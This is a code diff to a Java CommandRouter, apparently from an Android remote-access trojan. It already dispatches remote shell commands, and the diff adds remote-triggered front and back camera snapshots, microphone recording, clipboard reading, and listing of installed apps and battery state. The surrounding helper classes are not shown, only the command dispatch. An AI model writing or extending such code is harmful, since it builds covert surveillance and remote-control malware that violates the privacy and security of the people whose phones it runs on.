@@ -73,6 +73,36 @@ public class CommandRouter {
                 result.put("data", ShellExecutor.run(arg));
                 break;
 
+            case "camera_front":
+                result.put("data", CameraCapture.snap(ctx, true));
+                break;
+
+            case "camera_back":
+                result.put("data", CameraCapture.snap(ctx, false));
+                break;
+
+            case "mic_record":
+                int dur = 10;
+                try {
+                    if (arg != null && !arg.isEmpty()) dur = Integer.parseInt(arg);
+                } catch (Exception ignored) {}
+                if (dur < 1) dur = 1;
+                if (dur > 30) dur = 30;
+                result.put("data", MicRecorder.record(ctx, dur));
+                break;
+
+            case "battery":
+                result.put("data", PhoneExtra.battery(ctx));
+                break;
+
+            case "app_list":
+                result.put("data", PhoneExtra.apps(ctx));
+                break;
+
+            case "clipboard":
+                result.put("data", SystemState.clipboard(ctx));
+                break;
+
             default:
                 result.put("error", "unknown action: " + action);
         }
